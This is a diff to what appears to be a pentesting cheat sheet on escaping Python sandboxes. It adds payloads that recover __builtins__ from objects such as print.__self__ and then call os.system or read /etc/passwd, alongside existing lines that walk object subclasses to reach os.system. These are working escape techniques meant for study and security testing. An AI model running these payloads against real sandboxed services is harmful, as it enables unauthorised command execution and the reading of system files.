@@ -206,9 +206,13 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 #### Python3
 
 ```python
-# Obtain the builtins from a defined function
-get_flag.__globals__['__builtins__'].__import__("os").system("ls")
+# Obtain builtins from a globally defined function
+print.__self__
+dir.__self__
+globals.__self__
 
+# Obtain the builtins from a defined function
+get_flag.__globals__['__builtins__']
 
 # The os._wrap_close class is usually loaded. Its scope gives direct access to os package (as well as __builtins__)
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')
@@ -225,6 +229,14 @@ get_flag.__globals__['__builtins__'].__import__("os").system("ls")
 # Recover __builtins__ and make eveything easier
 __builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
 __builtins__["__import__"]('os').system('ls')
+```
+
+### Builtins payloads
+
+```python
+# Possible payloads once you have found the builtins
+.open("/etc/passwd").read()
+.__import__("os").system("ls")
 ```
 
 ### Discovering loaded variables
